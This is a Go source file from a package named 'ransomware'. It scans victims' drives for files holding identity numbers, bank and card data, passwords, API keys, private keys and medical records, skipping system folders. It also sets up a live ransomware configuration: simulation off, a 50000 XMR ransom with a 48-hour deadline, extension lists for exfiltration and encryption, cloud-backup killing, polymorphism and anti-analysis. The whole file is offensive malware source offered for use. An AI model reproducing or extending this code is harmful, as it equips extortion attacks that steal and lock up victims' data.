package ransomware

import (
	"context"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type RegexEngine struct {
	patterns     []SensitivePattern
	compiled     []*regexp.Regexp
	matchCount   atomic.Int64
	scanCount    atomic.Int64
	workers      int
}

type SensitivePattern struct {
	Name     string `json:"name"`
	Pattern  string `json:"pattern"`
	Category string `json:"category"`
	Severity string `json:"severity"`
	Weight   float64 `json:"weight"`
}

var defaultPatterns = []SensitivePattern{
	{Name: "DNI_NIE", Pattern: `[0-9]{8}[A-Z]`, Category: "identidad", Severity: "critical", Weight: 1.0},
	{Name: "Passport", Pattern: `[A-Z]{3}[0-9]{6}[A-Z]?`, Category: "identidad", Severity: "critical", Weight: 1.0},
	{Name: "SSN_US", Pattern: `\d{3}-\d{2}-\d{4}`, Category: "identidad", Severity: "critical", Weight: 1.0},
	{Name: "CreditCard", Pattern: `\b(?:\d[ -]*?){13,16}\b`, Category: "financiera", Severity: "critical", Weight: 0.9},
	{Name: "Email", Pattern: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`, Category: "contacto", Severity: "medium", Weight: 0.5},
	{Name: "PhoneES", Pattern: `(\+34|0034)?[6789]\d{8}`, Category: "contacto", Severity: "high", Weight: 0.7},
	{Name: "IBAN", Pattern: `[A-Z]{2}\d{2}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}`, Category: "financiera", Severity: "critical", Weight: 1.0},
	{Name: "Confidencial", Pattern: `(?i)(confidencial|secreto|clasificado|interno|no\s*distribuir)`, Category: "documento", Severity: "high", Weight: 0.8},
	{Name: "Password", Pattern: `(?i)(contraseña|password|passwd|clave|pwd)\s*[:=]\s*\S+`, Category: "credencial", Severity: "critical", Weight: 1.0},
	{Name: "Secret", Pattern: `(?i)(secreto|secret|classified|top\s*secret)`, Category: "documento", Severity: "high", Weight: 0.8},
	{Name: "Patent", Pattern: `(?i)(patente|patent|propiedad\s*intelectual|ip\s*right)`, Category: "propiedad", Severity: "high", Weight: 0.9},
	{Name: "Contract", Pattern: `(?i)(contrato|contract|acuerdo|agreement|nda)`, Category: "legal", Severity: "high", Weight: 0.8},
	{Name: "Database", Pattern: `(?i)(CREATE\s+TABLE|INSERT\s+INTO|SELECT\s+\*|ALTER\s+TABLE|DROP\s+TABLE)`, Category: "base_datos", Severity: "high", Weight: 0.7},
	{Name: "Health", Pattern: `(?i)(historial\s*médico|diagnóstico|paciente|patient|medical\s*record)`, Category: "salud", Severity: "critical", Weight: 1.0},
	{Name: "APIKey", Pattern: `(?i)(api[_-]?key|secret[_-]?key|token|sk-[A-Za-z0-9]{20,})`, Category: "credencial", Severity: "critical", Weight: 1.0},
	{Name: "AWSKey", Pattern: `AKIA[0-9A-Z]{16}`, Category: "credencial", Severity: "critical", Weight: 1.0},
	{Name: "PrivateKey", Pattern: `-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----`, Category: "credencial", Severity: "critical", Weight: 1.0},
	{Name: "ConnectionString", Pattern: `(?i)(Server|Data Source)\s*=[^;]+;\s*(Database|Initial Catalog)\s*=`, Category: "base_datos", Severity: "high", Weight: 0.8},
	{Name: "CCVEspanol", Pattern: `(?i)(tarjeta\s*de\s*crédito|número\s*de\s*tarjeta|cvv|codigo\s*seguridad)`, Category: "financiera", Severity: "critical", Weight: 0.9},
}

var sensitiveExtensions = []string{
	".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
	".txt", ".csv", ".rtf", ".odt", ".ods", ".odp",
	".pst", ".ost", ".msg", ".eml",
	".mdf", ".ldf", ".sql", ".sqlite", ".db", ".dbf",
	".zip", ".rar", ".7z", ".tar", ".gz",
	".pfx", ".p12", ".key", ".crt", ".cer",
	".ovpn", ".rdp", ".vnc",
	".vhd", ".vhdx", ".vmdk",
	".conf", ".config", ".env", ".ini", ".yml", ".yaml",
	".kdbx", ".kdb",
	".gpg", ".asc",
}

func NewRegexEngine(workers int) *RegexEngine {
	re := &RegexEngine{
		workers: workers,
	}
	for _, p := range defaultPatterns {
		compiled, err := regexp.Compile(p.Pattern)
		if err == nil {
			re.patterns = append(re.patterns, p)
			re.compiled = append(re.compiled, compiled)
		}
	}
	return re
}

func (re *RegexEngine) ScanFile(path string) (*ScanResult, []SensitiveData) {
	re.scanCount.Add(1)

	info, err := os.Stat(path)
	if err != nil {
		return nil, nil
	}

	result := &ScanResult{
		Path: path,
		Size: info.Size(),
	}
	category := classifyExtension(path)
	result.Category = category

	if info.Size() > 100*1024*1024 {
		return result, nil
	}

	f, err := os.Open(path)
	if err != nil {
		return result, nil
	}
	defer f.Close()

	var sensitiveData []SensitiveData
	var totalScore float64
	matchTracker := make(map[string]int)
	buf := make([]byte, min64(info.Size(), 512*1024))
	n, _ := f.Read(buf)
	content := string(buf[:n])

	for i, pattern := range re.patterns {
		matches := re.compiled[i].FindAllString(content, -1)
		if len(matches) > 0 {
			matchTracker[pattern.Name] = len(matches)
			totalScore += pattern.Weight * float64(len(matches))

			var context string
			if len(content) > 200 {
				context = content[:200]
			} else {
				context = content
			}

			sensitiveData = append(sensitiveData, SensitiveData{
				Type:     pattern.Name,
				FilePath: path,
				Pattern:  pattern.Pattern,
				Context:  sanitizeContext(context),
				Severity: pattern.Severity,
			})
		}
	}

	result.Score = totalScore
	result.Sensitive = len(sensitiveData) > 0

	if len(sensitiveData) > 0 {
		re.matchCount.Add(1)
	}

	return result, sensitiveData
}

func (re *RegexEngine) ScanDirectory(ctx context.Context, root string, excludePaths []string, results chan<- ScanResult, sensitive chan<- SensitiveData) error {
	var wg sync.WaitGroup
	sem := make(chan struct{}, re.workers)

	fileLimit := 10000
	scanned := atomic.Int64{}

	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if scanned.Load() >= int64(fileLimit) {
			return filepath.SkipAll
		}

		if d.IsDir() {
			name := strings.ToLower(d.Name())
			if name == "windows" || name == "system32" || name == "$recycle.bin" ||
				name == "boot" || name == "recovery" || strings.HasPrefix(name, "$") {
				return filepath.SkipDir
			}
			for _, ep := range excludePaths {
				if strings.Contains(strings.ToLower(path), strings.ToLower(ep)) {
					return filepath.SkipDir
				}
			}
			return nil
		}

		if !isSensitiveExtension(path) {
			return nil
		}

		info, infoErr := d.Info()
		if infoErr != nil || info.Size() > 200*1024*1024 {
			return nil
		}

		scanned.Add(1)
		wg.Add(1)
		select {
		case sem <- struct{}{}:
		case <-time.After(5 * time.Second):
			wg.Done()
			return nil
		}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			r, sd := re.ScanFile(path)
			if r != nil {
				select {
				case results <- *r:
				case <-time.After(2 * time.Second):
				}
			}
			for _, d := range sd {
				select {
				case sensitive <- d:
				case <-time.After(1 * time.Second):
					break
				}
			}
		}()
		return nil
	})

	wg.Wait()
	close(results)
	close(sensitive)
	return err
}

func (re *RegexEngine) Stats() (scanned, matched int64) {
	return re.scanCount.Load(), re.matchCount.Load()
}

func classifyExtension(path string) string {
	ext := strings.ToLower(filepath.Ext(path))
	switch ext {
	case ".pst", ".ost", ".msg", ".eml":
		return "correo"
	case ".mdf", ".ldf", ".sql", ".sqlite", ".db", ".dbf":
		return "base_datos"
	case ".pdf", ".doc", ".docx", ".xls", ".xlsx":
		return "documento"
	case ".pfx", ".p12", ".key", ".crt":
		return "certificado"
	case ".kdbx", ".kdb":
		return "password_manager"
	case ".vhd", ".vhdx", ".vmdk":
		return "disco_virtual"
	case ".pem", ".gpg", ".asc":
		return "crypto"
	case ".ovpn", ".rdp", ".vnc":
		return "conexion"
	case ".conf", ".config", ".env", ".yml", ".yaml":
		return "configuracion"
	default:
		return "documento"
	}
}

func isSensitiveExtension(path string) bool {
	ext := strings.ToLower(filepath.Ext(path))
	for _, se := range sensitiveExtensions {
		if ext == se {
			return true
		}
	}
	return false
}

func sanitizeContext(s string) string {
	if len(s) > 200 {
		s = s[:200]
	}
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", "")
	s = strings.ReplaceAll(s, "\t", " ")
	return s
}

func min64(a, b int64) int64 {
	if a < b {
		return a
	}
	return b
}

func NewScannerConfig() *RansomwareConfig {
	return &RansomwareConfig{
		Enabled:           true,
		Simulation:        false,
		RansomAmount:      50000,
		RansomCurrency:    "XMR",
		DeadlineHours:     48,
		ScanExtensions:    sensitiveExtensions,
		ExfilExtensions:   []string{".pst", ".ost", ".pdf", ".docx", ".xlsx", ".mdf", ".sql", ".kdbx", ".env", ".pem"},
		EncryptExtensions: []string{".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", ".zip", ".rar", ".7z", ".sql", ".mdf", ".pst", ".ost", ".dwg", ".bak"},
		ExcludePaths:      []string{"/proc", "/sys", "/dev", "/run", "/boot", "$Recycle.Bin", "System Volume Information", "AppData\\Local\\Temp"},
		MFTDestruct:       false,
		FirmwareSabotage:  false,
		CloudBackupKill:   true,
		PsychologicalTerror: false,
		PolymorphicEnabled:  true,
		AntiAnalysis:        true,
		ShamirParts:         3,
		ShamirThreshold:     3,
		DoubleEncryptCritical: true,
	}
}

func (c *RansomwareConfig) ShouldExfil(path string) bool {
	ext := strings.ToLower(filepath.Ext(path))
	for _, e := range c.ExfilExtensions {
		if ext == e {
			return true
		}
	}
	return false
}

func (c *RansomwareConfig) ShouldEncrypt(path string) bool {
	ext := strings.ToLower(filepath.Ext(path))
	for _, e := range c.EncryptExtensions {
		if ext == e {
			return true
		}
	}
	return false
}
